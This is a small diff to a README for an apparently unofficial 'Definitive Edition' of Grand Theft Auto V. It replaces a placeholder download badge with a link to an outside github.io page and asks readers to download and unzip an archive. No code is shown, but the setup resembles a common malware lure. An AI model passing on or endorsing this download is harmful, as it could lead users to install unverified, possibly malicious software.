@@ -8,7 +8,7 @@ This edition is ideal for fans who want **smoother performance, next-gen visuals
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://gta-v-definitive-edition.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Install **Grand Theft Auto V** (official PC version).  
